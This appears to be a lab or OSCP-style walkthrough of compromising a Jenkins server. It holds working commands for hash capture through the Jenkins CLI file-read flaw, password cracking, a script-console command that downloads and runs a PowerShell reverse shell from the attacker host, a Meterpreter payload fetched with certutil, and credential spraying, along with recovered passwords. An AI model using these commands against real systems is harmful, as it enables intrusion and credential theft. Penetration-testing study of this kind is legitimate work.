# 101
- Run `whatweb http://192.168.133.101:8080/login?from=%2F` will show `Jenkins version 2.150.2` is running.![[Pasted image 20240315172240.png]]
- Jenkins CLI arbitrary read (CVE-2024-23897 applies to versions below 2.442 and LTS 2.426.3)
- `sudo responder -I tun0 -A`
- `java -jar jenkins-cli.jar -s http://192.168.133.101:8080  who-am-i "@\\\\192.168.49.133\\test"`
- ![[Pasted image 20240316082626.png]]
- `hashcat -m 5600 nate.hash nate.hash /usr/share/wordlists/rockyou.txt --force` to recover plaintext credential as `oscp/nate:mariposa`![[Pasted image 20240316082851.png]]
- Use `nate:mariposa` to login to the `jenkins` server.![[Pasted image 20240316084026.png]]
- Navigate to `http://192.168.133.101:8080/script` 
	- Set up web server and netcat listener
	- Run`def process = "powershell.exe -nop -w hidden -c iex(iwr http://192.168.49.133/Windows/nishang/Shells/Invoke-PowerShellTcp.ps1 -UseBasicParsing); Invoke-PowerShellTcp -Reverse -IPAddress 192.168.49.133 -Port 443".execute()` within the `Script Console` to spawn a reverse shell.
	- ![[Pasted image 20240316084758.png]]![[Pasted image 20240316085000.png]]
- Upgrade shell
	- `msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.49.133 lport=443 -f exe -o met.exe`![[Pasted image 20240316092448.png]]
	- `certutil -urlcache -f http://192.168.49.133/met.exe met.exe`![[Pasted image 20240316092423.png]]
	- ![[Pasted image 20240316092656.png]]
	- ![[Pasted image 20240316092808.png]]
	- ![[Pasted image 20240316092916.png]]
	- Potential passwords and users at `C:\Users\administrator\appdata\roaming\Microsoft\windows\powershell\psreadline\ConsoleHost_history.txt`.![[Pasted image 20240316110226.png]]
	- Spraying the credential can find valid pair as `oscp\kate:Hard4Core8!` and the user have winrm access to `102`![[Pasted image 20240316110328.png]]
# 102
![[Pasted image 20240316110559.png]]
![[Pasted image 20240316110653.png]]
![[Pasted image 20240316114213.png]]
